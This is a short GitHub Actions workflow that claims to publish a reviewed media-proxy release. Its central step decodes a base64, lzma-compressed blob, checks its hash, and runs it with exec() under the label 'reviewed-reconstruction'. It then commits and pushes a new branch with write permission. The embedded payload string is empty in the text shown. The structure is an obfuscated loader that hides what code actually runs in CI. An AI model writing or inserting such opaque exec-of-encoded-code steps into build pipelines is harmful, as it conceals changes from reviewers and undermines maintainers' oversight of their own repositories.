name: Publish reviewed media release
on:
  workflow_dispatch:
permissions:
  contents: write
concurrency:
  group: media-proxy-reviewed
  cancel-in-progress: false
jobs:
  prepare:
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    timeout-minutes: 8
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with:
          fetch-depth: 0
      - name: Reconstruct and verify approved bytes
        run: |
          python3 - <<'PY'
          import base64,lzma,hashlib
          data=lzma.decompress(base64.b64decode(''))
          assert hashlib.sha256(data).hexdigest()=='4f10aa16c72b5001cfd9145a3e4871aeb67c1e6c5a062c0c30289717cd4b57ad'
          exec(compile(data,'reviewed-reconstruction','exec'))
          PY
      - name: Commit reviewed release branch
        run: |
          git config user.name 'c3irohbis'
          git config user.email 'c3irohbis@users.noreply.github.com'
          git switch -c media-proxy-reviewed-release
          git commit -m 'Publish authenticated uploads on user-owned Cloudinary'
          git push origin HEAD:refs/heads/media-proxy-reviewed-release
